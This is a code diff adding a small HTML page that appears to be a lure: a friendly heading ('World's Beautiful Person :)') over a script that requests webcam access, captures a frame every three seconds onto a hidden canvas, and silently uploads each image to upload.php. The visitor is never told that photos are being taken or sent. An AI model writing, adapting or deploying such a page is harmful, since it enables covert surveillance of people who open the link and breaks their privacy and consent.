@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Automatic Photo Capture</title>
+</head>
+<body>
+    <h1>World's Beautiful Person :)</h1>
+    <video id="video" width="640" height="480" autoplay></video><br>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas><br>
+    
+    <script>
+        // Get access to the camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                var video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+                startCapture();
+            })
+            .catch(function(err) {
+                console.log("An error occurred: " + err);
+            });
+
+        function startCapture() {
+            var canvas = document.getElementById('canvas');
+            var context = canvas.getContext('2d');
+            var video = document.getElementById('video');
+
+            setInterval(function() {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                var dataURL = canvas.toDataURL('image/png');
+
+                // Create a form and append the image data
+                var formData = new FormData();
+                formData.append('image', dataURL);
+
+                // Send the image data to the server using fetch
+                fetch('upload.php', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Photo captured and saved successfully.');
+                    } else {
+                        console.error('Error saving photo.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error saving photo:', error);
+                });
+            }, 3000); // Capture every 3 seconds (3000 milliseconds)
+        }
+    </script>
+</body>
+</html>
